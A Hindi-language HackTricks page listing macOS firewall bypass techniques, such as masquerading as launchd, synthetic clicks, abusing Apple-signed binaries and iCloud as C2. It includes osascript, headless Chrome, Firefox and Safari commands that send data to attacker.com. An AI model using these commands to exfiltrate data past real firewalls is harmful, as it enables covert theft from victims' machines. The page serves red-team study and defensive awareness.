# macOS फ़ायरवॉल को बायपास करना

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो** करें.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## पाए गए तकनीकें

निम्नलिखित तकनीकें कुछ macOS फ़ायरवॉल ऐप्स में काम करती पाई गईं।

### व्हाइटलिस्ट नामों का दुरुपयोग

* उदाहरण के लिए मैलवेयर को जाने-माने macOS प्रक्रियाओं के नामों जैसे **`launchd`** के साथ कॉल करना

### सिंथेटिक क्लिक

* यदि फ़ायरवॉल उपयोगकर्ता से अनुमति मांगता है तो मैलवेयर को **allow पर क्लिक करने के लिए बनाएं**

### **Apple हस्ताक्षरित बाइनरीज का उपयोग**

* जैसे **`curl`**, लेकिन अन्य जैसे **`whois`** भी

### जाने-माने apple डोमेन्स

फ़ायरवॉल जाने-माने apple डोमेन्स जैसे **`apple.com`** या **`icloud.com`** के लिए कनेक्शन की अनुमति दे सकता है। और iCloud का उपयोग C2 के रूप में किया जा सकता है।

### जेनेरिक बायपास

फ़ायरवॉल्स को बायपास करने के लिए कुछ विचार

### अनुमति प्राप्त ट्रैफ़िक की जांच करें

अनुमति प्राप्त ट्रैफ़िक को जानने से आपको संभावित रूप से व्हाइटलिस्टेड डोमेन्स की पहचान करने या उन तक पहुंचने के लिए अनुमति प्राप्त एप्लिकेशन्स की पहचान करने में मदद मिलेगी
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS का दुरुपयोग

DNS संकल्पनाएं **`mdnsreponder`** हस्ताक्षरित एप्लिकेशन के माध्यम से की जाती हैं जिसे संभवतः DNS सर्वरों से संपर्क करने की अनुमति होगी।

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

### ब्राउज़र एप्स के माध्यम से

* **osascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### प्रक्रियाओं के इंजेक्शन के माध्यम से

यदि आप किसी प्रक्रिया में **कोड इंजेक्ट कर सकते हैं** जिसे किसी भी सर्वर से जुड़ने की अनुमति है, तो आप फ़ायरवॉल सुरक्षा को बायपास कर सकते हैं:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## संदर्भ

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
